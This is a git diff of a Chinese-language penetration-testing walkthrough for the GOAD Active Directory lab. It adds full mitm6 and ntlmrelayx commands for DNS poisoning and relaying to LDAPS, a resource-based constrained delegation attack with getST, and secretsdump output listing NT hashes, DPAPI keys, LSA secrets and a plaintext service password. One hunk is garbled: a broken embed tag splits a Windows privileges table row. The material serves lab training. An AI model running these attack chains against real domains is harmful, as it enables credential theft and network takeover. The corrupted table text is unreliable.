@@ -259,7 +259,7 @@ proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
 ### DonPapi
 
 * 它用于获取 dpapi 和其他密码存储的信息（文件、浏览器、计划任务等）
-* 该工具不接触 LSASS，因此它更加隐蔽，并且即使在目标上启用了 av 和 edr，也能在大多数时间工作。
+* 该工具不接触 LSASS，因此它更加隐蔽，并且即使在目标上启用了 av 和 edr，也能在大多数时间工作
 
 ```
 proxychains DonPAPI -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
@@ -359,7 +359,9 @@ PRIVILEGES INFORMATION
 
 Privilege Name                            Description                                                        State   
 ========================================= ================================================================== ========
-SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
+SeAssignPrimaryToken{% 嵌入 url=" https://github.com/Orange-Cyber ​​defense/GOAD/blob/4cc6cbc1bdc86a236649d6c1e2c0dbf856bedeb6/ansible/roles/adcs_templates/files/ ESC1.json " %}
+
+Privilege             Replace a process level token                                      Disabled
 SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
 SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
 SeTcbPrivilege                            Act as part of the operating system                                Enabled 
@@ -409,11 +411,106 @@ C:\Windows\system32>
 
 >在实际的IPv6网络中，客户端的IPv6是由主机本身分配的，不需要DHCP服务器
 
-* 启动mitm6来毒害DHCPv6并从主机获取dns请求
-* 顺便说一句，我注意到我们可以毒害域控制器，但之后 DC 并不关心，仍然使用他们的本地主机 DNS 服务器。
-* 所以我们必须瞄准服务器
+* 启动mitm6来毒害 DHCPv6 并从主机获取 DNS 请求
+* 顺便说一句，我注意到我们可以毒害域控制器，但 DC 并不受影响，仍然使用他们的本地 DNS 服务器
+* 所以只能毒化 MSSQL 服务器
+* 接下来将毒害 braavos 服务器将 wpad 查询并将 http 查询中继到 meereen 上的 ldaps，以添加具有委派权限的计算机
 
-* 在这个例子中，我们将毒害 braavos 服务器。我们将回答 wpad 查询并将 http 查询转发到 meereen 上的 ldaps，以添加具有代理访问权限的计算机。
+* 使用mitm6开始中毒并启动ntlmrelayx
 
-〜首先，我们需要对 braavos.local 网络配置进行一些小更改〜（编辑：如果您在 08/18/2022 之后进行了 ansible 配置，则不再需要）
-在 rdp 上使用 khal.drogo:horse 连接到 braavos，并将以太网的 dns 服务器更改为自动（我将很快在 ansible 实验室手册中修复该问题，但现在您必须手动执行此操作）。仅将第一个以太网连接更改为自动 dns。
+```bash
+sudo /root/.local/bin/mitm6 -i eth1 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug
+```
+
+```bash
+sudo impacket-ntlmrelayx -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --add-computer fake01 --delegate-access
+```
+
+* -6 : 在 IPv4 和 IPv6 网络上监听并执行操作
+* -wh : ntlmrelayx 返回托管 WPAD 文件的服务器,由于不需要 WPAD 文件中的任何内容（mitm6 回答了所有问题），必须选择网络中不存在的主机
+* -t : 将凭据中继到指定的服务器，如果没有"-t"，凭据将转发回客户端
+* --add-computer : 尝试添加新的计算机帐户
+* --delegate-access : 将中继计算机帐户的访问权限委派给指定帐户(启动委派攻击)
+
+现在DNS已经中毒了
+![mitm6-1](images/mitm6-1.png)
+
+等待 wpad http 查询将请求转发到 ldap（您可以重新启动虚拟机以中毒和利用，无需等待）
+
+![ntlmrelayx1](images/ntlmrelayx1.png)
+
+成功创建新的计算机帐户并授予其对受害计算机的委派权限
+
+```bash
+[*] Attempting to create computer in: CN=Computers,DC=essos,DC=local
+[*] Adding new computer with username: fake01$ and password: x}W9.sOPB7$o4IY result: OK
+[*] Delegation rights modified succesfully!
+[*] fake01$ can now impersonate users on BRAAVOS$ via S4U2Proxy
+[*] Delegation rights modified succesfully!
+[*] fake01$ can now impersonate users on BRAAVOS$ via S4U2Proxy
+```
+
+接下来就进行**基于资源的约束委派攻击**，使用 getST 调用  S4U2Self 和 S4U2Proxy，完成对服务器Braavos$攻击
+
+```bash
+impacket-getST -spn cifs/braavos.essos.local essos.local/fake01\$ -impersonate Administrator
+```
+
+```bash
+export KRB5CCNAME=Administrator.ccache
+impacket-secretsdump -k -no-pass braavos.essos.local
+```
+
+```bash
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x9bb24fb9e9684ce8333026b4e7a67a4c
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:492c19fde6db57a251bf44c2b756ec3b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+[*] Dumping cached domain logon information (domain/username:hash)
+ESSOS.LOCAL/sql_svc:$DCC2$10240#sql_svc#89e701ebbd305e4f5380c5150494584a
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+ESSOS\BRAAVOS$:plain_password_hex:e478dc687076d76840a1e0dd1359e01270e998be36408a64063c4fb37c1bfc84b2e0daf4ae9655fa925c79d5bba72bc44e222de0f4a27cb60419ec81786895538eae378e3526380ba4d5e0e2cd2e1079d6ea6fe62110946a516f021ac12e0c39f0150cc74c6e0a9107d8ea4e20d371d8e6691fdb9d045ad68ebf4ce16e2dee4037cf5b24f912f06e6666339ab690848c07520daded4396e51e6d94da2f400049ddd96ca69594b3f772bea07a17e3d2e0a1ef1f10b3dda7be2ff00c57c6e58ff8020dac7b08828ad2d00735199bbef7a2e816acba3177ae191e8306b8c895fed66ef69419627f35b7f4503a6a498ee8d3
+ESSOS\BRAAVOS$:aad3b435b51404eeaad3b435b51404ee:6cddb97c1fe7a8230d654413f2799e0b:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x15a98c9d9a40dbd9f71472cc20e6ed21046177d8
+dpapi_userkey:0x1935d54fb2e3d629e6dbf76dbc988c08a31529a2
+[*] NL$KM 
+ 0000   26 72 00 BB 64 CB DD D7  34 20 B4 AC 7E 9A 99 05   &r..d...4 ..~...
+ 0010   75 95 40 EF C7 ED 72 3E  F4 66 93 E7 3D C9 B8 56   u.@...r>.f..=..V
+ 0020   EC E8 6E 4E 40 13 86 34  A8 F6 E6 36 C6 71 9F 7A   ..nN@..4...6.q.z
+ 0030   8F 63 A3 23 D9 37 A0 BC  07 C0 0B 06 41 21 5E 64   .c.#.7......A!^d
+NL$KM:267200bb64cbddd73420b4ac7e9a9905759540efc7ed723ef46693e73dc9b856ece86e4e40138634a8f6e636c6719f7a8f63a323d937a0bc07c00b0641215e64
+[*] _SC_MSSQL$SQLEXPRESS 
+essos.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+```
+
+我们也可以指定一个战利品目录，转存ldap上的所有信息
+
+```bash
+impacket-ntlmrelayx -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l loot
+```
+
+参考链接：
+
+<https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/>
+<https://chryzsh.github.io/relaying-delegation/>
+
+## Coerced auth smb + ntlmrelayx to ldaps with drop the mic
+
+可以使用多种方法（petitpotam、printerbug、DFSCoerce）强制从 meereen DC 到我们的主机的连接
+要强制执行强制操作而不需要在不同方法之间进行选择，我们可以使用刚刚提出的一体化工具[coercer](https://github.com/p0dalirius/Coercer)
+
+参考链接：
+
+<https://en.hackndo.com/ntlm-relay/>
+
+<https://www.thehacker.recipes/ad/movement/ntlm/relay>
